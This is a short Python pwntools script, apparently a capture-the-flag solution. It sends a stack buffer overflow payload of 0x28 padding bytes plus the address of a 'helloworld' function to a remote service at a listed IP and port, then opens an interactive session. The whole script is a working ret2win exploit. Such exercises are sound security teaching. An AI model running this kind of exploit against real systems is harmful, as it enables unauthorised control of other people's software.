#!/usr/bin/env python3
from pwn import *

e = ELF('./helloworld')
r = remote('140.115.59.7', 10000)
payload = b'\x00'*(0x28)
payload+= p64(e.symbols['helloworld'])
r.sendline(payload)

r.interactive()
r.close()
